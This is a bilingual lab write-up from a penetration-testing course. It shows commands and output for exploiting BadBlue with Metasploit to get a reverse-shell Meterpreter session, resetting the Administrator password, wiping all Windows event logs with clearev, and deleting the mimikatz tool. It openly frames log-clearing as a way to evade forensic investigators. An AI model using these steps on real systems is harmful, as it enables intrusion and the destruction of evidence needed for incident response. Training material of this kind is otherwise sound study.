---
layout: post
title: "Clearing Windows Event Logs"
date: "2023-03-03"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Clearing Windows Event Logs
## Windows Event Logs
The Windows OS stores and catalogs all actions/events performed on the system and stores them in the Windows Event log.

Event logs are categorized based on the type of events they store:
* Application logs: Stores application/program events like startups, crashes etc.
* System logs: Stores system events like startups, reboots etc.
* Security logs: Stores security events like password changes, authentication failures etc.

Event logs can be accessed via the Event Viewer on Windows.

The event logs are the first stop for any forensic investigator after a compromise has been detected. It is therefore very important to clear your tracks after you are done with your assessment.

# 清除 Windows 事件日志
## Windows 事件日志
Windows 操作系统存储和编目在系统上执行的所有操作/事件，并将它们存储在 Windows 事件日志中。

事件日志根据它们存储的事件类型进行分类：
* 应用程序日志：存储应用程序/程序事件，如启动、崩溃等。
* 系统日志：存储系统事件，如启动、重新启动等。
* 安全日志：存储密码更改、身份验证失败等安全事件。

可以通过 Windows 上的事件查看器访问事件日志。

事件日志是任何取证调查员在检测到危害后的第一站。 因此，在完成评估后清除痕迹非常重要。

# Demo: Clearing Windows Event Logs（演示：清除 Windows 事件日志）
The clean-up process will revolve around clearing your event logs, deleting any of the files or exploit code that you've transferred over to the target.

Target IP Address: 10.2.27.188

```
service postgresql start && msfconsole -q
workspace -a Clearev # Clear Event logs
setg RHOSTS 10.2.27.188
search badblue
use exploit/windows/http/badblue_passthru
show options
set target BadBlue\ EE\ 2.7\ Universal
exploit
```

Perform local system enumeration.

```
meterpreter > sysinfo
Meterpreter : x86/windows
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
```

We currently have administrative privileges. You do need elevated privileges in order to clear the Windows Event Log.

We head over to the target machine.

Search: event Viewer

The current clock is 10:05 PM.

`Windows Logs->Security`

The last security log was added here at 10:02.

It looks like an account was logged off.

Nothing has been logged here after 10:02. There's nothing that has been logged in regards to anything that we've done after we've gained access.

Open up a shell session on the target and get a command prompt.

Change the password for the Administrator user.

```
meterpreter > shell

C:\Program Files (x86)\Badblue\EE>net user administrator Password_123321
```

Let's see whether that was logged.

`Windows Logs->Security`: Load up Security Events.

Date and Time: 10:07:06 PM, Task Category: User Account Management.

It's going to tell you a user account was changed. The changed attributes are the SAM Account Name. And as a forensic investigator, this information is very important.

If we click on the latest one, you can see that An attempt was made to reset an account's password. That's the latest event log. And this just comfirms that the password was changed. All our actions are being logged.

If there is an indicator of compromise, then the forensic investigator will disconnect this system from the Internet and then begin exploring the event logs.

Let's take a look at how we can clear all of this.

```
meterpreter > clearev
```

`Windows Logs->Security`

The latest one was 10:08. This will tell you The audit log was cleared.

That's not helpful for a forensic invertigator, because the user that did it was the Administrator.

`Windows Logs->System`

The Remote Registry service entered the stopped state. The system log file was cleared.

That is how to clear your tracks on a Windows system. 

Clearing you event logs is just one part of the process. The next thing you need to do is delete or wipe the exploit files or executables that you transferred over to the target system, which, in our case, we didn't do much apart from Mimikatz.

Remove a file.

```
meterpreter > rm mimikatz.exe
```

# Clearing Windows Event Logs（清除 Windows 事件日志）
## Overview
Goal

This lab covers the process of clearing Windows event logs with Metasploit.

## 概述
目标

本实验涵盖使用 Metasploit 清除 Windows 事件日志的过程。

# 复现视频内容
Target IP Address : 10.0.20.20

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > workspace -a Clearev
[*] Added workspace: Clearev
[*] Workspace: Clearev
msf5 > setg RHOSTS 10.0.20.20
RHOSTS => 10.0.20.20
msf5 > search badblue

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


msf5 > use exploit/windows/http/badblue_passthru
msf5 exploit(windows/http/badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.0.20.20       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf5 exploit(windows/http/badblue_passthru) > set target 
set target 0                            set target BadBlue\ 2.72b\ Universal    
set target 1                            set target BadBlue\ EE\ 2.7\ Universal  
msf5 exploit(windows/http/badblue_passthru) > set target BadBlue\ EE\ 2.7\ Universal 
target => BadBlue EE 2.7 Universal
msf5 exploit(windows/http/badblue_passthru) > exploit

[*] Started reverse TCP handler on 10.10.16.10:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (180291 bytes) to 10.0.20.20
[*] Meterpreter session 1 opened (10.10.16.10:4444 -> 10.0.20.20:49240) at 2023-03-03 16:46:37 +0530

meterpreter > 

```

```
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator

```

![Event-Viewer-Windows-Logs.png](/img/in-post/ine/Event-Viewer-Windows-Logs.png)

![Windows-Logs-Security-before.png](/img/in-post/ine/Windows-Logs-Security-before.png)

![Windows-Logs-Security-Administrator-Logoff.png](/img/in-post/ine/Windows-Logs-Security-Administrator-Logoff.png)

![Windows-Logs-Application.png](/img/in-post/ine/Windows-Logs-Application.png)

![Windows-Logs-System.png](/img/in-post/ine/Windows-Logs-System.png)

```
meterpreter > shell
Process 656 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\BadBlue\EE>net user administrator password_123321   
net user administrator password_123321
The command completed successfully.

```

![QQ图片20230303195724.png](/img/in-post/ine/QQ图片20230303195724.png)

![QQ图片20230303195936.png](/img/in-post/ine/QQ图片20230303195936.png)

```
meterpreter > clearev
[*] Wiping 255 records from Application...
[*] Wiping 520 records from System...
[*] Wiping 15906 records from Security...
```

![QQ图片20230303200226.png](/img/in-post/ine/QQ图片20230303200226.png)

![QQ图片20230303200423.png](/img/in-post/ine/QQ图片20230303200423.png)

![QQ图片20230303200523.png](/img/in-post/ine/QQ图片20230303200523.png)